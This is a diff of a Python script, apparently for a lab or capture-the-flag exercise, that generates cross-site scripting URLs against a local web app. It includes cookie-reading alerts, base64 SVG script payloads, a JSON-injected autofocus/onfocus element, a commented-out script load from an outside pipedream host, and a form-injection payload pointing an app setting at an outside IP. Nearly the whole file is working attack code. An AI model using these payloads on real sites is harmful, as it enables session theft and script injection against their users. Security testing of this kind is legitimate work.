@@ -1,12 +1,26 @@
 from urllib.parse import quote
 from base64 import b64encode
-# http://localhost:3000/posts?name=EMBED&src=data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
 
+# Функция для генерации JSON для children: <img src="1" onerror="PAYLOAD">
+def generate_children_json(payload):
+    if not payload:
+        return None  # Если payload пустой, не добавляем childrenJson
+    json_structure = {
+        "type": "img",
+        "props": {
+            "autofocus": "1",  # Недействительный src, чтобы сработал onerror
+            "onfocus": payload  # Здесь вставляется контролируемый payload
+        },
+        "children": None  # Нет вложенных элементов
+    }
+    import json
+    json_str = json.dumps(json_structure, separators=(',', ':'))  # Компактный JSON без пробелов
+    return quote(json_str)  # URL-кодируем для добавления в query string
 
 base = "http://localhost:3000/"
 
-name = "embed"
-name = "script"
+# name = "embed"
+# name = "script"
 # name = "img"
 
 # payload = "alert(1);"
@@ -22,9 +36,9 @@ name = "script"
 # form.id = 'config';
 # form.innerHTML = '<input name="debug" value="http://217.19.4.141:8000" />';
 # document.body.appendChild(form);'''
-payload='''alert(document.cookie);'''
+payload = '''alert(document.cookie);'''
 # payload = 'eval(atob("'+b64encode(payload.encode()).decode()+'"));'
-src = "data:text/javascript,"+payload
+# src = "data:text/javascript," + payload
 # src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0phdmFTY3JpcHQgZXhlY3V0ZWQgZnJvbSB3aXRoaW4gU1ZHIScpOzwvc2NyaXB0Pjwvc3ZnPg=='
 # payload = '''
 # window.open('http://localhost:3000/about');
@@ -49,9 +63,17 @@ src = "data:text/javascript,"+payload
 # name = "script"
 # src="https://eoikvczv5cff25f.m.pipedream.net/xss.js"
 
+
+# Генерируем childrenJson и добавляем в URL
+name = "input"
+src = "1"
+payload= "asd"
 jsbin_p = f"<{name} src=\"{src}\">"
 
+children_json_quoted = generate_children_json(payload)
 url_p = f"{base}?name={quote(name)}&src={quote(src)}"
+if children_json_quoted:
+    url_p += f"&childrenJson={children_json_quoted}"
 
 # print(jsbin_p)
 print(url_p)
